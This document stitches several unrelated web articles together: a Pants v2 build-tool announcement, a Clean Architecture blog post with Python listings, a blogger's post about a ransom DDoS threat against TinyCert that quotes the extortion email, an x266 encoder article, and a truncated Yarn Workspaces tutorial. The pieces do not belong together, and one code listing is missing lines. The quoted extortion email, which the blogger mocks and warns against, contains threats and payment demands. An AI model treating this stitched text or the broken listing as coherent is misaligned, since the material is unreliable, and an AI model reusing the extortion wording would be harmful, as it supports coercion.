addressing the drawbacks of that system. Luckily, at the same time as we began thinking about this hypothetical next system, a new motivating problem emerged: Python builds.</p><h2 id="python-builds-today">Python builds today</h2><p>As you probably know, Python has skyrocketed in popularity in recent years. Not only is it used to build a wide variety of server applications, via frameworks such as <a href="https://www.djangoproject.com/">Django</a> and <a href="https://flask.palletsprojects.com/en/1.1.x/">Flask</a>, but it's also the language of choice for data scientists, thanks to powerful libraries and tools such as <a href="https://numpy.org/">NumPy</a>, <a href="https://www.scipy.org/">SciPy</a>, <a href="https://pandas.pydata.org/">Pandas</a> and <a href="https://jupyter.org/">Jupyter</a>. </p><p>Python hits a sweet spot of simplicity and power, but there is a big problem - there is no truly great scalable build tool for Python, and this is becoming a real pain point as Python repos grow like never before. &nbsp;</p><p>Python builds today involve manually invoking a wide variety of tools. Each tool has to be installed, configured and invoked in just the right way, often while sequencing the output of one tool into input of another. Knowing how to use each tool in a given scenario is complicated and burdensome. </p><p>Sure, you can hack around the problem for a while with some combination of shell scripts, <a href="https://www.gnu.org/software/make/manual/make.html">Makefiles</a>, <a href="https://tox.readthedocs.io/en/latest/">tox</a>, and <a href="https://python-poetry.org/">poetry</a>. But even a small code change might require you to run a huge amount of sequential build work. Re-executing the same processes with the same inputs over and over again is a frustrating waste of time and resources. &nbsp;And these solutions start to break down as your codebase grows.</p><p>Perhaps you experimented with more complex build systems, such as <a href="https://bazel.build/">Bazel</a> or <a href="https://v1.pantsbuild.org/">Pants v1</a>. &nbsp;But it's laborious to maintain all that BUILD metadata, all for a sub-par experience not optimized for Python. Not to mention the difficulty of implementing your own custom build logic. </p><p>Alternatively, maybe you've been tempted to split up your codebase into multiple interdependent repos, each with their own "smaller" builds. But that creates an even thornier problem, namely how to manage those interdependencies. Having to propagate changes across codebase boundaries can slow development down to a crawl, and leave you with the worst of both worlds - slower processes and a fragmented, unmanageable codebase.</p><p>A great build system for repos - of all sizes - that include Python code would support fine-grained invalidation and caching, so that it only executes the build work actually affected by a change. It would support concurrent local and even remote execution, to greatly speed up work by using all available CPU. It would be easy to adopt in a small repo, but would scale up as your codebase grows. It wouldn't require huge amounts of boilerplate metadata, and it would be easy to extend with custom build logic. </p><p>Well, Pants v2 is that system! </p><h2 id="introducing-pants-v2">Introducing Pants v2</h2><p><a href="https://www.pantsbuild.org/">Pants v2</a> is a completely new open-source build system, inspired by our work on Pants v1. &nbsp;We've been developing and testing it for the last couple of years, and it's finally ready for prime time!</p><p>A key factor in the design of Pants v2 was a set of lessons we learned from Pants v1 and other existing systems, such as Bazel. Among them: that ease of use and performance matter, boilerplate is annoying, concurrency and caching require hard design work, and most people will need custom logic at some point.</p><h3 id="lesson-1-ease-of-use-and-performance-both-matter">Lesson #1: Ease of use and performance both matter</h3><p>When designing software you often find yourself making tradeoffs between ease of use and performance. But in a build system, both are vital. The Pants v2 execution engine - which is the performance-critical heart of the system - is written in <a href="https://www.rust-lang.org/">Rust</a>, for raw speed. And the domain-specific build logic is written in familiar, easy to work with, type-annotated Python 3. This helps make Pants v2 easy to extend, without compromising performance. </p><p>Pants v2 also runs a daemon that memoizes fine-grained build state in memory, for even faster performance. This daemon watches for changes to your source files and precisely invalidates its state on the fly to ensure that the minimum amount of work happens the next time you build.</p><h3 id="lesson-2-writing-build-metadata-is-a-real-drag">Lesson #2: Writing build metadata is a real drag</h3><p>Some build tools are slow because they don't have enough information about the structure of your code to intelligently perform incremental work. Others have gone too far in the other direction, requiring a huge amount of metadata and boilerplate in BUILD files, especially relating to your code's dependencies. </p><p>Pants v2 offers the best of both worlds - intelligent, fine-grained incremental work, without the boilerplate. It does so by assuming sensible, magic-free defaults, inferring dependencies from the import statements in your code, and supporting plugins for custom inference logic. Stay tuned for an upcoming post on exactly how Pants achieves this!</p><h3 id="lesson-3-design-for-caching-concurrency-and-remoting">Lesson #3: Design for caching, concurrency and remoting </h3><p>Writing build logic that can be cached and executed concurrently and remotely is very hard. You have to be very careful about not producing or consuming side-effects, and it's extremely difficult to tack that on later. And unless you design your APIs with care, supporting these kinds of features often places severe restrictions on what your build logic may safely do. </p><p>In Pants v2, build logic is composed of <a href="https://en.wikipedia.org/wiki/Pure_function">pure</a> Python 3 <a href="https://docs.python.org/3/library/asyncio-task.html">async coroutines</a>. So a build rule can depend not only on its inputs, but can also await on new data at runtime - all of which is precisely tracked for invalidation and caching. This gives us the best of both worlds: logic that is properly isolated from side-effects, and is therefore amenable to caching, concurrent execution and remoting, while still allowing the use of natural control flow.</p><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/caching.gif" alt=""><figcaption>We run both tests, then add a syntax error to one test and rerun; the unmodified test uses the cache and is isolated from the syntax error.</figcaption></figure><h3 id="lesson-4-almost-everyone-needs-to-customize-their-builds">Lesson #4: Almost everyone needs to customize their builds</h3><p>Most teams have custom build steps, so extensibility is a key feature in any build system. Pants v2 is built around a <a href="https://www.pantsbuild.org/docs/plugins-overview">plugin architecture</a>. You can write your own rules using the same API as the built-in functionality. So your custom build logic will enjoy the same fine-grained invalidation, caching, concurrency and remote execution abilities as the core Pants code.</p><h2 id="pants-2-0-0-is-out-now-">Pants 2.0.0 is out now!</h2><p>All this leads me to the happy announcement that <a href="https://pypi.org/project/pantsbuild.pants/2.0.0/">Pants 2.0.0</a>, the first stable release of Pants v2, is out now! 2.0.0 is the culmination of years of design and development work, and many months of beta testing at several organizations. So we're really happy, proud (and relieved…) to finally have it ready for general use. </p><p>You can see what Python tools Pants currently supports <a href="https://www.pantsbuild.org/docs/python">here</a>. There are also commands for querying and understanding your dependency graph, and a robust help system. &nbsp;We're adding support for additional tools and features all the time, and it's straightforward to implement your own. Beta users have already written their own logic for Cython and docker, for example. </p><p>Now is a great time to adopt Pants 2.0.0! The team that developed Pants v2 is <a href="https://www.pantsbuild.org/docs/community">ready to help you</a> onboard, answer any questions, and even pair with you to help you write any custom build logic. We're also eager to get feedback, bug reports and suggestions for what features we should focus on in the next weeks and months of development.</p><p>Pants v2 is developed by a helpful open source community, is funded by a 501(c)6 non-profit, and has excellent support available. If you have a growing Python codebase, and want to take Pants 2.0.0 for a spin, <a href="https://www.pantsbuild.org/docs/community">let us know</a>. We'd love to fit you with some new Pants today!</p>

                <p>Take <strong>Uncle Bob's</strong> Clean Architecture and map its correspondences with <strong>Gary Bernhardt's</strong> thin imperative shell around a functional core, and you get an understanding of how to cheaply maintain and scale software!</p>
<p>This is what <a href="https://rhodesmill.org/brandon/">Mr. Brandon Rhodes</a> did. It's not every day that I find such clear insight.</p>
<p>I am honored to have found his <a href="https://rhodesmill.org/brandon/talks/#clean-architecture-python">presentation</a> and <a href="https://rhodesmill.org/brandon/slides/2014-07-pyohio/clean-architecture/">slides</a> explaining  <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">Uncle Bob's Clean Architecture</a> and Gary Bernhardt's PyCon talks of <a href="https://archive.org/details/pyvideo_422___units-need-testing-too">2011</a>, <a href="https://pycon-2012-notes.readthedocs.io/en/latest/fast_tests_slow_tests.html">2012</a>, and <a href="https://www.destroyallsoftware.com/talks/boundaries">2013</a>.</p>
<p>Mr. Rhodes offers such a distilled view, that he can show you these crucial concepts in 3 slides of code. I will go ahead and summarize what he said and add a tiny bit of my insight.</p>
<p>Copyright of all Python code on this page belongs to <a href="https://rhodesmill.org/brandon/">Mr. Brandon Rhodes</a>, and copyright of the diagram belongs to <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">Robert C. Martin (Uncle Bob)</a>. I use these under (hopefully) fair use (nonprofit and educational).</p>


<p>First of all, we need to be on the same page, in order to be able to understand each other. Here are the words I'll use:</p>
<ul>
<li>Function: I use "function" or "pure function" to refer to a Python "function" that only uses its parameters for input, returns a result as output, and does not cause any other side-effects (such as I/O). <ul>
<li>A pure function returns the same output given the same inputs.</li>
<li>A pure function may be called any number of times without changing the system state - it should have no influence on DB, UI, other functions or classes.</li>
<li>This is very similar to a mathematical function: takes you from <em>x</em> to <em>y</em> and nothing else happens.</li>
<li>Sadly we can't have only pure functions; software has a <strong>purpose</strong> of causing side-effects.</li>
</ul>
</li>
<li>Procedure, Routine, or Subroutine: A piece of code that executes, that may or may not have side effects. This is a "function" in Python, but might not be a "pure function".</li>
<li>Tests: automated unit tests. By "unit" I mean not necessarily just a class, but a behavior. If you want, see more details in <a href="https://danuker.go.ro/tdd-revisited-pytest-updated-2020-09-03.html#update-2020-09-03-keep-coupling-low">the coupling chapter of my previous post</a>.</li>
</ul>

<div><pre><span></span><code><span>import</span> <span>requests</span>                      <span># Listing 1</span>

    <span>data</span> <span>=</span> <span>response</span><span>.</span><span>json</span><span>()</span>           <span># I/O</span>
    <span>definition</span> <span>=</span> <span>data</span><span>[</span><span>u</span><span>'Definition'</span><span>]</span>

        <span>raise</span> <span>ValueError</span><span>(</span><span>'that is not a word'</span><span>)</span>
    <span>return</span> <span>definition</span>
</code></pre></div>
<p>Here, we have a piece of code that prepares a URL, then gets some data over the network (I/O), then validates the result (a word definition) and returns it.</p>
<p>This is a bit much: a procedure should ideally do one thing only. While this small-ish procedure is quite readable still, it is a metaphor for a more developed system - where it could be arbitrarily long.</p>
<p>The current knee-jerk reaction is to <em>hide</em> the I/O operations somewhere far away. Here is the same code after extracting the I/O lines:</p>

<div><pre><span></span><code><span>def</span> <span>find_definition</span><span>(</span><span>word</span><span>):</span>           <span># Listing 2</span>
    <span>q</span> <span>=</span> <span>'define '</span> <span>+</span> <span>word</span>
    <span>url</span> <span>=</span> <span>'http://api.duckduckgo.com/?'</span>
    <span>url</span> <span>+=</span> <span>urlencode</span><span>({</span><span>'q'</span><span>:</span> <span>q</span><span>,</span> <span>'format'</span><span>:</span> <span>'json'</span><span>})</span>
    <span>data</span> <span>=</span> <span>call_json_api</span><span>(</span><span>url</span><span>)</span>
    <span>definition</span> <span>=</span> <span>data</span><span>[</span><span>u</span><span>'Definition'</span><span>]</span>
    <span>if</span> <span>definition</span> <span>==</span> <span>u</span><span>''</span><span>:</span>
        <span>raise</span> <span>ValueError</span><span>(</span><span>'that is not a word'</span><span>)</span>
    <span>return</span> <span>definition</span>

<span>def</span> <span>call_json_api</span><span>(</span><span>url</span><span>):</span>
    <span>response</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>url</span><span>)</span>     <span># I/O</span>
    <span>data</span> <span>=</span> <span>response</span><span>.</span><span>json</span><span>()</span>           <span># I/O</span>
    <span>return</span> <span>data</span>
</code></pre></div>
<p>In Listing #2, the I/O is extracted from the top-level procedure. </p>
<p>The problem is, the code is still <strong>coupled</strong> - <code>call_json_api</code> is called whenever you want to test anything - even the building of the URL or the parsing of the result.</p>
<p><strong>Coupling kills software.</strong></p>
<p>A good rule of thumb to spot coupling is this: Can you test a piece of code without having to mock or dependency inject like Frankenstein?</p>
<p>Here, we can't test <code>find_definition</code> without somehow replacing <code>call_json_api</code> from inside it, in order to avoid making HTTP requests.</p>
<p>Let's find out what a better solution looks like.</p>

<div><pre><span></span><code><span>def</span> <span>find_definition</span><span>(</span><span>word</span><span>):</span>           <span># Listing 3</span>
    <span>url</span> <span>=</span> <span>build_url</span><span>(</span><span>word</span><span>)</span>
    <span>data</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>url</span><span>)</span><span>.</span><span>json</span><span>()</span>  <span># I/O</span>
    <span>return</span> <span>pluck_definition</span><span>(</span><span>data</span><span>)</span>

<span>def</span> <span>build_url</span><span>(</span><span>word</span><span>):</span>
    <span>q</span> <span>=</span> <span>'define '</span> <span>+</span> <span>word</span>
    <span>url</span> <span>=</span> <span>'http://api.duckduckgo.com/?'</span>
    <span>url</span> <span>+=</span> <span>urlencode</span><span>({</span><span>'q'</span><span>:</span> <span>q</span><span>,</span> <span>'format'</span><span>:</span> <span>'json'</span><span>})</span>
    <span>return</span> <span>url</span>

<span>def</span> <span>pluck_definition</span><span>(</span><span>data</span><span>):</span>
    <span>definition</span> <span>=</span> <span>data</span><span>[</span><span>u</span><span>'Definition'</span><span>]</span>
    <span>if</span> <span>definition</span> <span>==</span> <span>u</span><span>''</span><span>:</span>
        <span>raise</span> <span>ValueError</span><span>(</span><span>'that is not a word'</span><span>)</span>
    <span>return</span> <span>definition</span>
</code></pre></div>
<p>Here, the procedure at the top (aka. the <span><strong>imperative shell</strong></span> of the program) is handling the I/O, and everything else is moved to <span><strong>pure functions</strong></span> (<code>build_url</code>, <code>pluck_definition</code>). The <span><strong>pure functions</strong></span> are easily testable by just calling them on made-up data structures; no Frankenstein needed.</p>
<p>This separation into an <span><strong>imperative shell</strong></span> and <span><strong>functional core</strong></span> is an encouraged idea by Functional Programming.</p>
<p>Ideally, though, in a real system, you wouldn't test elements as small as these routines, but integrate more of the system. See <a href="https://danuker.go.ro/tdd-revisited-pytest-updated-2020-09-03.html#update-2020-09-03-keep-coupling-low">the coupling chapter of my previous post</a> to understand the trade-offs.</p>

<p>Look at <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">Uncle Bob's Clean Architecture chart</a> (Copyright Robert C. Martin aka. Uncle Bob) :
<img alt="The Clean Architecture" src="https://danuker.go.ro/images/CleanArchitecture.jpg"></p>
<p>Uncle Bob's <span><strong>Use Cases</strong></span> and <span><strong>Entities</strong></span> (red and yellow circles of the chart) map to the <span><strong>pure functions</strong></span> we saw earlier - <code>build_url</code> and <code>pluck_definition</code> from Listing 3, and the <span><strong>plain objects</strong></span> they receive as parameters and send as outputs. <em>(updated 2020-10-28)</em></p>
<p>Uncle Bob's <span><strong>Interface Adapters</strong></span> (green circle) map to the top-level <span><strong>imperative shell</strong></span>  from earlier - <code>find_definition</code> from Listing 3, handling only I/O to the outside (Web, DB, UI, other frameworks).</p>
<p><a href="https://www.reddit.com/r/programming/comments/jj7ave/the_grand_unified_theory_of_software_architecture/gabst6z/?context=3">Update 2020-10-28</a>: A "Model" object in today's MVC frameworks is a poisoned apple: it is not a <a href="https://khanlou.com/2014/12/pure-objects/">"pure" object</a> or <a href="http://xunitpatterns.com/Humble%20Object.html">"humble" object</a>, but one that can produce side effects like saving or loading from the database. Their "save" and "read" methods litter your code with untestable side-effects all over. Avoid them, or confine them to the periphery of your system and reduce their influence accordingly (they are actually a hidden <span><strong>Interface Adapter</strong></span>) due to interacting with the DB.</p>
<p>Notice the arrows on the left side of the circles, pointing inwards to more and more abstract parts. These are procedure or function calls. Our code is called by the outside. <strong>This has some exceptions. Whatever you do, the database won't call your app. But the web can, a user can through a UI, the OS can through STDIN, and a timer can, at regular intervals (such as in a game).</strong> <em>(updated 2020-10-28)</em></p>
<p>The top-level procedure:</p>
<ol>
<li>gets the input, </li>
<li>adapts it to simple objects acceptable to the system,</li>
<li>pushes it through the functional core,</li>
<li>gets the returned value from the functional core,</li>
<li>adapts it for the output device,</li>
<li>and pushes it out to the output device.</li>
</ol>
<p>This lets us easily test the functional core. Ideally, most of a production system should be pure-functional.</p>

<p>If you reduce the <span><strong>imperative shell</strong></span> and move code into the <span><strong>functional core</strong></span>, each test can verify almost the entire (now-functional) stack, but stopping short of actually performing external actions.</p>
<p>You can then test the imperative shell using <strong>fewer integration tests</strong>: you only need to check that it is <strong>correctly connected</strong> to the functional core.</p>
<p>Having two users for the system - the real user and the unit tests - and listening to both, lets you guide your architecture so as to <strong>minimize coupling</strong> and build a more <strong>flexible system</strong>.</p>
<p>Having a flexible system lets you implement new features and change existing ones <strong>quickly and cheaply</strong>, in order to <strong>stay competitive as a business</strong>.</p>
<p>Comments are much appreciated. I am yet to apply these insights, and I may be missing something!</p>
<p><strong>Edit 2020-10-28:</strong> I have tried out this methodology in some small TDD Katas, and together with TDD, it works great. But I am not employed right now, so I can't say I've <em>really</em> tried it.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Posted by admin on 28 October 2020 at 06:15 CET. Latest update on 28 October 2020 at 17:02 CET.</p>
<p>A greedy bunch of bastards calling themselves "Voodoo Bear" sent an <a href="#mail">email</a> to my private email address announcing a DDoS attack aimed at TinyCert to take place, starting Monday 2 November 2020. They seem to be under the impression that there is a large company with deep pockets behind TinyCert, which I suppose is flattering. TinyCert is just a pet project of mine, that I find useful for myself and figured others might find it useful too.</p>
<h3>Ransom demands</h3>
<p>As you can see from the <a href="#mail">email below</a>, they are demanding a "small" $1000 ransom to call off the attack, increasing their demands by $1000 per day they are not met. TinyCert has been up for 6 years now and costs me about $200 per year to run ($1200 thusfar) and the total amount of <a href="https://www.tinycert.org/donate">donations</a> in that time has been $75, as I guess not enough people found it useful enough to consider donating. Thus, even if I <i>could</i> pay the ransom, I would not want to. If the site goes down, so be it, the version I use privately will be unaffected anyway.</p>
<h3>What can I do about it?</h3>
<p>Realistically, nothing. I could change the IP address by moving to another host or hosting provider, so that the attack goes to the wrong place. That would probably not be effective, at least not for very long. Besides, I would much rather the moronic dipshits waste their time and effort by attacking my little pet project rather than going after somebody who might actually pay them. Heck, if anything, they're saving me money if I have to shut down the site.</p>
<h4>Cloudflare?</h4>
<p>Using Cloudflare or similar services is not an option. The dumb idiots indicate they will attack the network directly (most likely the IP address of the server TinyCert is running on, rather than the actual network of my hosting provider). Since it is a very lightweight server, as TinyCert requires very little in terms of server resources, it won't hold up against a proper DDoS attack for any significant length of time. If anything, it will be interesting to see how well it holds up. For Cloudflare's protection to be effective, the IP address would first have to be changed (which in itself is easily done - I guess the criminals overestimate how much work it is to migrate a small website), but the Cloudflare SSL proxy is not suitable in the free tier. This is because the free tier does not allow the use of a custom certificate and TinyCert uses <abbr title="HTTP Public Key Pinning">HPKP</abbr>. There is also no way I could afford the higher tier that allows that.</p>
<p><strong>Update:</strong> Cloudflare CEO Matthew Prince has <a href="https://twitter.com/eastdakota/status/1321320999678136325">offered Cloudflare's assistance</a> at no cost if needed. I hope it will not be necessary, but kudos to him and Cloudflare for their work and the kind offer.</p><h4>Open source?</h4>
<p>It has been suggested that I open-source the TinyCert codebase and allow people to have their own local versions, which of course wouldn't be affected. This too is not an option. Parts of the codebase are licensed to me personally and providing the source to them would be a breach of that license. Swapping that out for open source code would be possible, but time consuming and labour intensive and not something I am willing to do.</p>
<h3 id="mail">The actual email received</h3>
<p>Here is a copy of the email, for anybody who is interested.</p>
<div>
	<p>
		From: Robert Clark &lt;robertclark@coronaxy.com&gt;<br>
		Subject: If www.tinycert.org is important to you, you must read this<br>
		Date: Wed, 28 Oct 2020 02:13:37 +0000
	</p>
	<div><p>
		PLEASE FORWARD THIS EMAIL TO SOMEONE IN YOUR COMPANY WHO IS ALLOWED TO MAKE IMPORTANT DECISIONS!</p><p>
		==========================================</p><p>
		We are the Voodoo Bear and we have chosen www.tinycert.org as target for our next DDoS attack.<br>
		Please perform a google search for "Voodoo Bear" to have a look at some of our previous work.</p><p>
		Your network will be subject to a DDoS attack starting at 2020 November 2nd (Monday).</p><p>
		THIS IS NOT A HOAX, and to prove it right now we will start a small attack on www.tinycert.org that will last for 30 minutes.<br>
		It will not be heavy attack, and will not cause you any damage so don't worry, at this moment.</p><p>
		This means that your website, e-mail and other connected services will be unavailable for everyone.</p><p>
		We will refrain from attacking your servers for a small fee.<br>
		The current fee is $1000(USD) in bitcoins (BTC). The fee will increase by 1000 USD for each day after deadline that passed without payment.</p><p>
		Please send Bitcoin to the following Bitcoin address (cAsE-SeNsitIve):</p><p>
		[address removed]</p><p>
		You can easily buy bitcoins via several websites or even offline from a Bitcoin-ATM. We suggest you coinmama.com or https://buy.coingate.com/ for buying bitcoins.</p><p>
		Once you have paid we will automatically get informed that it was your payment. Please note that you have to make payment before the deadline or the attack WILL start!</p><p>
		If you decide not to pay, we will start the attack on the indicated date and uphold it until you do, there's no counter measure to this, you will only end up wasting more money trying to find a solution (Cloudflare, Sucuri, Imperva and similar services are useless, because we will hit your network directly).</p><p>
		We will completely destroy your reputation and make sure your services will remain offline until you pay.<br>
		We will also download your database and do as much damage as possible.</p><p>
		Do not reply to this email, don't try to reason or negotiate, we will not read any replies.</p><p>
		Once you have paid we won't start the attack and you will never hear from us again.</p><p>
		Please note that Bitcoin is anonymous and no one will find out that you have complied.</p><p>
		-- Voodoo Bear team
	</p></div>
</div>
<p>I literally laughed out loud at the first sentence, as it indicates how clueless these numbskulls are. Maybe I'll forward the email to my budgerigars, as they are the only other living beings in here, though I'm not sure they're qualified to make any decisions.</p>
<p><strong>Update:</strong> some users have reported receiving similar emails. On the one hand, that is a good thing, as it reduces the likelihood of (persistent) follow-through on the part of these scumbags. On the other hand, the more widespread this is, the more likely it is that somebody will give in and pay up. If you receive a threat like this, do not comply. It will only encourage them that their actions are successful and marks you as being susceptible to caving in to pressure.</p>
<p>So, Mr. "Clark" or "Voodoo Bear", whatever you hilariously pitiable imbeciles call yourselves, you can just fuck off. I have not for a nanosecond considered giving in to your demands, even if I could. You wanna waste your time to take down my pet project? Be my guest. My taking the time and effort to Write this page is the only thing you have "achieved" as you're not getting a penny from me. And thank you for thinking TinyCert something worthy of extortion - that means I must've done something right in creating it.</p>
<p>Well, there you go. It's been fun while it lasted. This is why we can't have nice things.</p>

<p><strong>MulticoreWare is a software development company that works on video compression, ML, heterogeneous computing, and championed the open-source x265 encoder in the past. They are now driving the x266 project to create an open-source VVC (Versatile Video Coding) encoder and use their experience from their UHDKit product to make it the premier open-source VVC encoder.</strong></p>




<h2><span id="Who_is_MulticoreWare"></span><strong>Who is MulticoreWare?</strong><span></span></h2>



<p><a href="https://multicorewareinc.com/" target="_blank" aria-label="MulticoreWare (opens in a new tab)" rel="noreferrer noopener">MulticoreWare</a> is a multi-faceted company with expertise in different verticals such as high-performance Video Compression, AI &amp; Video Analytics, ADAS (Automated Driver Assistance), etc. A common thread through these verticals is their ability to design and write high-performance code for various computing platforms. MulticoreWare’s background and experience are cool, in my opinion, and how they’ve nurtured and built a strong team in a very complex niche is admirable.</p>



<p>With teams in the US, India, China, and Germany, MulticoreWare is well-placed to don the role of a thought-leader in the open-source video codec world.</p>



<p>Let’s see why and what their plans are!</p>



<h2><span id="The_Road_To_x266_%E2%80%93_An_Open_Source_VVC_Encoder"></span><strong>The Road To x266 – An Open Source VVC Encoder</strong><span></span></h2>



<p>MPEG announced three new video codecs – VVC (Versatile Video Coding), EVC (Essential Video Coding), and LCEVC (Low Complexity Enhancement Video Coding). Of these three, VVC or H.266 is touted as the successor to H.265 (HEVC) and promises 50% more compression efficiency over HEVC but comes at a much higher complexity. Here’s a <a href="https://ottverse.com/vvc-evc-lcevc-mpeg-video-codecs/">brief explanation of all three</a> on OTTVerse.</p>



<p>But, first, let’s take a look at HEVC and the x265 encoder.</p>



<h3><span id="x265_and_HEVC"></span><strong>x265 and HEVC</strong><span></span></h3>



<p>MulticoreWare announced the <a href="https://x265.com/" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">x265 project</a> back in 2013, and it was a success. x265 allowed video compression teams worldwide to get their hands on an efficient, standards-compliant HEVC encoder. x265 was made available under the open-source <a href="http://www.gnu.org/licenses/old-licenses/gpl-2.0.html" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">GNU GPL v2 license</a> and also offered by MulticoreWare under Commercial License Agreements.</p>



<p>But, having a good encoder clearly wasn’t enough. Because, fast-forward 7 years, and unfortunately, HEVC is still embroiled in patent-wars that seem destined to give it a “death by a thousand cuts.”&nbsp;</p>



<p>HEVC’s situation is rather unfortunate considering that HEVC had interesting features such as the use of quadtree-decomposition, large block sizes, the concept of TU, PU, and CUs, the Sample Adaptive Offset filter, new picture types, and several innovations which made it possible to compress 4K videos quite efficiently (in comparison to H.264/AVC).</p>



<h3><span id="The_x266_Project"></span><strong>The x266 Project</strong><span></span></h3>



<p>Riding on the back of their x265 success, MulticoreWare has decided to pioneer the x266 project along the x265 project lines they worked on earlier. x266 will be an open-source project with the MulticoreWare video compression team’s full attention and the backing of an industry-consortium.</p>



<p>As with any new codec, there are always early adopters (both programmers and companies) willing to give it a try, evaluate, file tickets, and contribute code. But, to get the ball rolling, you need a reliable encoder that is not only standards-compliant but also reasonably fast and with enough presets and knobs to make the early-adoption both valuable and exciting (in a geeky-sense!)</p>



<p>I spoke to <a href="https://www.linkedin.com/in/shivakumarasu/" target="_blank" aria-label="Shivakumar Narayanan (opens in a new tab)" rel="noreferrer noopener">Shivakumar Narayanan</a>, Senior Director – Marketing and Product Management at MulticoreWare, about the consortium, and this is what he had to say –</p>



<blockquote><p><em>Similar to when we did this for x265 consortium, to get key consortium members on board and invest in the development of this codec. These members will be founding partners with benefits when the codec (rather encoder is ready to release for the open-source world). Consortium members being strategic, will also play an important role in the shaping of this codec as well as prioritization of functionalities as it would pertain to their and their customers’ interests.</em></p></blockquote>



<p>Industry involvement bodes well for the open-source community because <strong>video encoder implementation is both an art and a science.</strong></p>



<p>It helps to have a proficient team that understands and implements concepts such as wavefront parallelism, multi-threading, intrinsics, etc. to make codec implementations practical and useful. And, of course, people with “golden eyes” to spot issues with video quality as they occur.&nbsp;</p>



<p>MulticoreWare has such a team, and I feel they’ll bring their experience from x265 to the x266 development.</p>



<h3><span id="Expertise_from_UHDKit"></span><strong>Expertise from UHDKit</strong><span></span></h3>



<p>Another product in MulticoreWare’s portfolio is <a href="https://x265.com/uhdkit/" target="_blank" rel="noopener">UHDKit</a>. It is an extended encoding library built on top of the x264 (AVC) encoder and x265 (HEVC) encoder libraries. It has a better performance and feature-set than the vanilla x264, x265, and svt-av1 encoders. UHDKit comes in-built with powerful features such as a “control system for video compression” that dynamically adjusts settings to achieve better video quality based on the computing platform’s spec. </p>



<p>Additional features include fast ABR encoding (to get the bitrate ladder faster!) and high-performance live encoding, all this on software, without any requirement for additional hardware accelerators. It can be used as a standalone encoding library or can be invoked via the FFmpeg framework, which makes it seamlessly integrate into any software encoding/ transcoding pipeline.</p>



<p>I am sure some of this expertise from building UHDKit will rub off on the x266 encoder development.</p>



<h2><span id="How_Do_I_Get_my_hands_on_x266"></span><strong>How Do I Get my hands on x266?</strong><span></span></h2>



<p>Currently, MulticoreWare is working closely with x266 Consortium members and after a few months, it will be available to them.</p>



<p>Upon enquiring about the open-source implementation, here’s what MCW had to say –</p>



<blockquote><p><em>For the larger open source community, it will be made available when we have reached critical mass required for its first release. As we near readiness, we will update here on how you can get hold of it.</em></p></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>What Is A Yarn Workspace?</h2><p>Before I start to use a new technology, I first try to make sure that I really understand what it is. </p><p>This means getting the definition of what it is to be as crystal clear as possible for me, in all areas that compose the technology.</p><p>This is what we will first do with Yarn Workspaces before we dive into the way we can use them for our projects.</p><p><strong>We can briefly state that a Yarn Workspace is a method of combining multiple project NPM dependencies into a single workspace, so that all projects share the same dependencies. This is commonly referred to as a ‘</strong><a target="_blank" title="monorepo" href="https://www.perforce.com/blog/vcs/what-monorepo"><strong>monorepo</strong></a><strong>’.</strong></p><p>To get an even better understanding of what a Yarn Workspace is, it's best to take a look at the broader picture of the problem it solves and why that problem exists in the first place.</p><h2>The Multi-Megabyte Problem that a Yarn Workspace solves</h2><p>While the emergence of open source packages within the NPM ecosystem has lead to <a target="_blank" title="https://flaviocopes.com/node-modules-size/" href="https://flaviocopes.com/node-modules-size/">tremendous benefits</a> and time-saved on project code, the fact that so many node modules are now needed for even the simplest of projects has led to a lot of bloat in overall project size. </p><p>The average node js project, specifically the dependencies located within it, <a target="_blank" title="https://forum.freecodecamp.org/t/node-modules-is-huge-is-this-normal/137282/12" href="https://forum.freecodecamp.org/t/node-modules-is-huge-is-this-normal/137282/12">have a total estimated size of 76MB</a>.</p><p>For a single, web based project for example, this is huge.</p><p>When working on more complex projects, with dependencies from a variety of frameworks, this size can swell even more. I’m sure we’re all familiar with the infamous Godzilla 500+ MB /node_modules folder.</p><p>Imagine now, with these large individual file sizes on each project, that we had a multi-project setup with each project that needed to have its own dependencies, such as what you might find in a standard MERN or MEVN stack. With a separate /client and /server folder structure, each with their own package.json and subsequent package dependencies.</p><p>Each of these projects would have to be loading in their own dependencies, and sometimes, as shown in the drawing above, having the same duplicate dependencies loaded in for each folder, causing massive unnecessary bloat. Not to mention the issues that would arise from dealing with out-of-date code and the potential conflicts in the overall codebase.</p><p>These issues are what are commonly referred to as ‘<a target="_blank" title="https://blog.appsignal.com/2020/04/09/ride-down-the-javascript-dependency-hell.html" href="https://blog.appsignal.com/2020/04/09/ride-down-the-javascript-dependency-hell.html">dependency hell’</a>. </p><p><strong>And it’s not a new issue. Infact, its been around for a long time. </strong></p><p>Fortunately, there are now solutions to this problem. That solution as we have stated above is the monorepo. </p><p>One of the most prominent (within the NPM ecosystem) of which is the <em><strong>Yarn Workspace</strong></em>.</p><p><strong>Whose benefits alongside the obvious bloat reduction mentioned above, include:</strong></p><p>-	Better code-quality and optimization due to packages being linked together. Leading to more up to date code in general. </p><p>-	All your dependencies installed together at one time, leading to better ability for Yarn to optimize them.</p><p>-	Yarn gets to make a single lock file rather than multiple, giving you fewer conflicts and making code review easier.</p><p>So now that we have a clearer overall picture of what a Yarn Workspace is in general. Let’s now take a look at what it actually looks like and how we can go about setting it up within a project.</p><h2><strong>How Do You Set Up A Yarn Workspace? And What Does It Looks Like?</strong></h2><p>Setting up a Yarn Workspace is as easy as running a few commands and making some edits to a few simple pages.</p><h3><strong>The general steps are:</strong></h3><p><strong>1. Create your main project directory with a command like this:</strong></p><p>$ mkdir my-monorepo-workspace</p><p><strong>2. Navigate to the newly created project directory root and create your package.json.</strong></p><p>$ cd my-monorepo-workspace</p><p>$ touch package.json</p><p><strong>3. Replace the contents of your package.json with the following:</strong></p><p>{</p><p>   "private": true,</p><p>   "name": "my-monorepo-workspace",</p><p>   "workspaces": [],</p><p>   "scripts": {}</p><p>}</p><p>This makes the workspace project that we have created private, as 